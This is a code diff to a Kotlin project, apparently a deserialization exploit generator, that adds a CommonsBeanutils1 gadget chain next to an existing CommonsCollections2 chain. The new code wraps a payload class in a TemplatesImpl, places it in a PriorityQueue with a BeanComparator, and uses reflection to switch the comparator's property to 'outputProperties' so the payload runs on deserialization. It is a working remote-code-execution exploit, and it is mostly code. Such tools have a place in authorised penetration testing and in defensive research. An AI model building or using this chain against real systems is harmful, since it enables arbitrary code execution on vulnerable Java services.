@@ -1,16 +1,41 @@
 package com.xhstormr.app
 
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter
+import org.apache.commons.beanutils.BeanComparator
 import org.apache.commons.collections4.Transformer
 import org.apache.commons.collections4.comparators.TransformingComparator
 import org.apache.commons.collections4.functors.ChainedTransformer
 import org.apache.commons.collections4.functors.ConstantTransformer
 import org.apache.commons.collections4.functors.InstantiateTransformer
 import org.apache.commons.collections4.functors.InvokerTransformer
+import java.math.BigInteger
 import java.util.PriorityQueue
 import javax.xml.transform.Templates
 
 enum class Chain {
+
+    CommonsBeanutils1 {
+        override fun generate(payload: Class<*>): Any {
+            val templates = Gadgets.createTemplatesImpl(payload)
+            // mock method name until armed
+            val comparator = BeanComparator<Any>("lowestSetBit")
+
+            // create queue with numbers and basic comparator
+            val queue = PriorityQueue(2, comparator)
+            // stub data for replacement later
+            queue.add(BigInteger("1"))
+            queue.add(BigInteger("1"))
+
+            // switch method called by comparator
+            comparator.setFieldValue("property", "outputProperties")
+
+            // switch contents of queue
+            val queueArray = queue.getFieldValue("queue") as Array<Any>
+            queueArray[0] = templates
+            queueArray[1] = templates
+            return queue
+        }
+    },
 
     CommonsCollections2Chain {
         override fun generate(payload: Class<*>): Any {
